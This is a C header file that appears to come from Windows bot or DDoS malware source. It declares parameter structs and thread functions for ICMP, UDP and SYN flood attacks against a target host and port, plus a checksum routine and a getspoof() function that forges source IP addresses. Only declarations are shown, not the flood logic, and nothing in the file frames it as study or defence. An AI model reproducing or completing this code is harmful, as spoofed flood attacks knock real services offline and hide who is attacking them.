struct icmps
/* struct for icmpflood() function */
{
	int tnum;
	int time;
	char host[128];
	bool fullspoof;
	bool gotinfo;
	SOCKET sock;
};

struct udps
/* struct for udpflood() function */
{
	int tnum;
	int time;
	unsigned short port;
	char host[128];
	bool fullspoof;
	bool gotinfo;
	SOCKET sock;
};

struct syns
/* struct for synflood() function */
{
	int tnum;
	int time;
	unsigned short port;
	char host[128];
	bool fullspoof;
	bool gotinfo;
	SOCKET sock;
};

unsigned short checksum(unsigned short *buf, int len);

unsigned long getspoof(const char *ip, bool fullspoof);

DWORD WINAPI icmpflood(void *param);

DWORD WINAPI udpflood(void *param);

DWORD WINAPI synflood(void *param);